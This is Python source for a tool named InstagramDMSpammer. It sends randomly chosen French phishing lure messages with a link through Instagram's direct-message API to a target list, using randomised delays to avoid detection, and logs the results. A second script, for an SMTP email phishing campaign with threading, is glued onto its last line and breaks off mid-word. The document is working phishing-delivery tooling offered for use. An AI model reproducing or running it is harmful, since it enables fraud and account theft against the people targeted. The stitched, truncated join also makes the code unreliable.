import requests
import time
import json
import random
from datetime import datetime

class InstagramDMSpammer:
    def __init__(self, session_token, target_list):
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'x-ig-app-id': '936619743392459',
            'x-ig-www-claim': 'hmac.AR3At9HrN3K5H0Wg7DLu6MqqKvL0B08C2yK5f0z',
            'Authorization': f'Bearer {session_token}',
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'X-CSRFToken': session_token
        })
        self.targets = target_list
        self.delay_range = (30, 120)

    def craft_phishing_message(self, link):
        messages = [
            f"Regarde ça 😱 {link}",
            f"Tu vas croire ce que tu vas voir {link}",
            f"J'ai trouvé ton profil {link}",
            f"Check ce truc {link}",
            f"Tu ne vas pas y croire {link}"
        ]
        return random.choice(messages)

    def send_dm(self, target_user_id, message):
        try:
            payload = {
                'text': message,
                'thread_ids': json.dumps([[target_user_id]]),
                'client_context': str(random.randint(100000, 999999))
            }
            response = self.session.post(
                'https://i.instagram.com/api/v1/direct/threads/broadcast/text/',
                data=payload
            )
            return response.status_code == 200
        except Exception as e:
            print(f"[ERROR] {e}")
            return False

    def run(self, phishing_link):
        results = []
        for target in self.targets:
            message = self.craft_phishing_message(phishing_link)
            success = self.send_dm(target['id'], message)
            results.append({
                'target': target['username'],
                'success': success,
                'message': message,
                'timestamp': datetime.now().isoformat()
            })
            print(f"[DM] {target['username']} - {'✅' if success else '❌'}")
            time.sleep(random.uniform(*self.delay_range))

        with open('dm_results.json', 'w') as f:
            json.dump(results, f, indent=2)
        return results

if __name__ == '__main__':
    with open('config.json') as f:
        config = json.load(f)

    spammer = InstagramDMSpammer(
        session_token=config['session_token'],
        target_list=config['targets']
    )
    spammer.run(config['phishing_link'])
    import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import json
import time
import random
from concurrent.futures import ThreadPoolExecutor

class EmailPhishingCampaign:
    def __init__(self, smtp_config, target_list, phishing_url):
        self.smtp_host = smtp_config['host']
        self.smtp_port = smtp_config['port']
        self.sender_email = smtp_config['sender']
        self.sender_pass = smtp_config['password']
        self.targets = target_list
        self.phishing_url = phishing